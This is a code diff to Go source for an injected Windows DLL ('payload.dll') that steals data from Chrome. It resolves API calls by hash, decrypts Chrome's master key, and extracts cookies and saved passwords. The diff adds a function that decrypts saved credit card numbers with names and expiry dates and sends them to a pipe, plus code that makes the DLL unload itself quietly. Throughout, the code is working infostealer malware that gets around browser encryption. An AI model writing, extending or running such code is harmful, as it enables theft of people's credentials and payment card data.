@@ -20,20 +20,23 @@ import (
 )
 
 var (
-	kernel32Base          uintptr
-	ole32Base             uintptr
-	oleaut32Base          uintptr
-	createFileW           uintptr
-	writeFile             uintptr
-	closeHandle           uintptr
-	coInitializeEx        uintptr
-	coUninitialize        uintptr
-	coCreateInstance      uintptr
-	coSetProxyBlanket     uintptr
-	sysAllocStringByteLen uintptr
-	sysFreeString         uintptr
-	sysStringByteLen      uintptr
-	hPipe                 uintptr
+	kernel32Base             uintptr
+	ole32Base                uintptr
+	oleaut32Base             uintptr
+	createFileW              uintptr
+	writeFile                uintptr
+	closeHandle              uintptr
+	coInitializeEx           uintptr
+	coUninitialize           uintptr
+	coCreateInstance         uintptr
+	coSetProxyBlanket        uintptr
+	sysAllocStringByteLen    uintptr
+	sysFreeString            uintptr
+	sysStringByteLen         uintptr
+	freeLibraryAndExitThread uintptr
+	getModuleHandleW         uintptr
+	hPipe                    uintptr
+	hModule                  uintptr
 )
 
 const (
@@ -75,6 +78,12 @@ func init() {
 	sysAllocStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysAllocStringByteLen"))
 	sysFreeString = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysFreeString"))
 	sysStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysStringByteLen"))
+	freeLibraryAndExitThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("FreeLibraryAndExitThread"))
+	getModuleHandleW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetModuleHandleW"))
+
+	// Get our own module handle for later unload
+	dllName, _ := wincall.UTF16ptr("payload.dll")
+	hModule, _, _ = wincall.CallG0(getModuleHandleW, uintptr(unsafe.Pointer(dllName)))
 
 	go run()
 }
@@ -118,7 +127,6 @@ func uninitCOM() {
 }
 
 func decryptKey(encryptedKey []byte) ([]byte, error) {
-	writePipe("DEBUG:decryptKey: allocating BSTR")
 	bstrEnc, _, _ := wincall.CallG0(sysAllocStringByteLen,
 		uintptr(unsafe.Pointer(&encryptedKey[0])),
 		uintptr(len(encryptedKey)),
@@ -269,11 +277,23 @@ func run() {
 			}
 			totalPasswords += len(passwords)
 		}
+
+		cards, err := extractPaymentsFromProfile(masterKey, profile)
+		if err != nil {
+		} else {
+			for _, card := range cards {
+				writePipe(fmt.Sprintf("CARD:[%s]%s", profile, card))
+			}
+		}
 	}
 
 	writePipe(fmt.Sprintf("total: %d cookies, %d passwords", totalCookies, totalPasswords))
 
 	writePipe("DONE")
+
+	if hModule != 0 {
+		wincall.CallG0(freeLibraryAndExitThread, hModule, 0)
+	}
 }
 
 func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
@@ -374,7 +394,6 @@ func extractCookiesFromProfile(masterKey []byte, profile string) ([]string, erro
 
 func extractPasswordsFromProfile(masterKey []byte, profile string) ([]string, error) {
 	loginPath := filepath.Join(getChromeUserDataPath(), profile, "Login Data")
-	// way to get around temp file copy due to chrome locking db files
 	uri := "file:" + loginPath + "?immutable=1"
 	db, err := sql.Open("sqlite", uri)
 	if err != nil {
@@ -410,6 +429,50 @@ func extractPasswordsFromProfile(masterKey []byte, profile string) ([]string, er
 				decrypted = decrypted[32:]
 			}
 			results = append(results, fmt.Sprintf("%s|%s|%s", url, username, string(decrypted)))
+		}
+	}
+
+	return results, nil
+}
+
+func extractPaymentsFromProfile(masterKey []byte, profile string) ([]string, error) {
+	webDataPath := filepath.Join(getChromeUserDataPath(), profile, "Web Data")
+	uri := "file:" + webDataPath + "?immutable=1"
+	db, err := sql.Open("sqlite", uri)
+	if err != nil {
+		return nil, fmt.Errorf("open db: %v", err)
+	}
+	defer db.Close()
+
+	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+	if err != nil {
+		return nil, fmt.Errorf("query: %v", err)
+	}
+	defer rows.Close()
+
+	var results []string
+	for rows.Next() {
+		var nameOnCard string
+		var expMonth, expYear int
+		var encCardNumber []byte
+		if err := rows.Scan(&nameOnCard, &expMonth, &expYear, &encCardNumber); err != nil {
+			continue
+		}
+
+		if len(encCardNumber) < 3 {
+			continue
+		}
+
+		prefix := string(encCardNumber[:3])
+		if prefix == "v20" {
+			decrypted, err := decryptAESGCM(masterKey, encCardNumber)
+			if err != nil {
+				continue
+			}
+			if len(decrypted) > 32 {
+				decrypted = decrypted[32:]
+			}
+			results = append(results, fmt.Sprintf("%s|%02d/%d|%s", nameOnCard, expMonth, expYear, string(decrypted)))
 		}
 	}
 
